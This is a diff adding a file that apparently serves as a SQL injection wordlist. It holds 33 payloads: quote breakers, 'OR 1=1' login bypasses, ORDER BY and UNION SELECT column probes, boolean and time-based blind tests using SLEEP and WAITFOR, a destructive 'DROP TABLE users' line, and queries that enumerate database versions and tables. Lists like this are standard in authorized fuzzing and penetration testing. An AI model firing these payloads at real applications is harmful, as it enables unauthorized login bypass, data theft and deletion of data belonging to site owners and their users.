@@ -1,0 +1,33 @@
+'
+"
+''
+`
+')
+")
+`)
+' OR '1'='1
+' OR '1'='1' --
+' OR 1=1 --
+' OR 1=1#
+' OR 1=1/*
+admin'--
+admin' #
+admin'/*
+' OR 'x'='x
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+' AND 1=1--
+' AND 1=2--
+1 AND 1=1
+1 AND 1=2
+' AND SLEEP(3)--
+1; WAITFOR DELAY '0:0:3'--
+'; DROP TABLE users--
+1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--
+' OR SLEEP(3)--
+1 UNION SELECT @@version
+1 UNION SELECT table_name FROM information_schema.tables
